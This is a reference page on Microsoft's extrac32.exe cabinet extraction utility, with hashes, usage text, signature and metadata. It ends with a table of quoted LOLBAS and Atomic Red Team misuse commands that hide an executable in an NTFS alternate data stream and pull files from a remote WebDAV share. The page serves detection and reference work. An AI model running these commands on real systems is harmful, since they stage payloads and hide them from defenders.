---
title: extrac32.exe | Microsoft CAB File Extract Utility
---

# extrac32.exe 

* File Path: `C:\Windows\SysWOW64\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `86B9CB961782E250DC9ABA701AF1C4FA`
SHA1 | `998B6BDC5AD215818F45246E0DD053D1ACAF9A2A`
SHA256 | `2E2CAFD7954A9FB3FD321194BD3BB691CECEE01189A51E821ED1B40DCE929007`
SHA384 | `F184B267CBDBA09A7F451CDFCB9EBF765CBA5E0FDC4C15304CA3505C9E37C268F1F45081997808600D0F24819F823A56`
SHA512 | `C8B36D911AA86F209417218BAA11427FE926B71A3FC9387BE205FBDEF7655E788EBE274461070132EC9223E097CB485A54FFB1A75C572DB5F5B3D8A33AFDACBE`
SSDEEP | `768:zYDhe6vxKKGWodru4ZpzBnaLR6ZQhLhstdNus:zOheqxKbpz5a1nhYXus`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

EXTRACT [/Y] [/A] [/D | /E] [/L dir] cabinet [filename ...]
EXTRACT [/Y] source [newname]
EXTRACT [/Y] /C source destination

  cabinet  - Cabinet file (contains two or more files).
  filename - Name of the file to extract from the cabinet.
             Wild cards and multiple filenames (separated by
             blanks) may be used.

  source   - Compressed file (a cabinet with only one file).
  newname  - New filename to give the extracted file.
             If not supplied, the original name is used.

  /A         Process ALL cabinets.  Follows cabinet chain
             starting in first cabinet mentioned.
  /C         Copy source file to destination (to copy from DMF disks).
  /D         Display cabinet directory (use with filename to avoid extract).
  /E         Extract (use instead of *.* to extract all files).
  /L dir     Location to place extracted files (default is current directory).
  /Y         Do not prompt before overwriting an existing file.
```

### Loaded Modules:

Path |
-- |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\wow64.dll |
C:\Windows\System32\wow64win.dll |
C:\Windows\SysWOW64\extrac32.exe |


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (WinBuild.160101.0800)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\System32\extrac32.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\SysWOW64\extrac32.exe` | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020 Strontic.


